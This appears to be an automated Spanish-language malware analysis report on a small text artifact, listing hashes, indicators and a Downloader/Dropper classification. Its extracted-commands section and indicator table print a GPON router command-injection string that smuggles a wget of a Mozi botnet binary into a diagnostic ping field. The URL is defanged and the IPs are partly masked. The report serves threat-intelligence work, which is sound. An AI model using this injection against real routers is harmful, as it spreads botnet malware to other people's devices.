# 🧬 Payload Analysis

`480e053f3c6a26e85b8841ad81284806821eb75a3d389addbb2d7e66b0f981a5`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 118 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.m+-O+-` en `hxxp://100.5.110.XXX:51986/Mozi.m+-O+-`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:50:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `480e053f3c6a26e85b8841ad81284806821eb75a3d389addbb2d7e66b0f981a5`
- **SHA1:** `75d8c6d78e60694979dcfafc2be0c10f5126e6e2`
- **MD5:** `1f03fd593296bf398a125896229bd386`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.1 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://100.5.110.XXX:51986/Mozi.m+-O+- | strings |
| ip | 100.5.110.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://100.5.110.XXX:51986/Mozi.m+-O+->/tmp/gpon80; | strings |
| hash | 480e053f3c6a26e85b8841ad81284806821eb75a3d389addbb2d7e66b0f981a5 | static_analysis |
| ip | 162.4.163.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
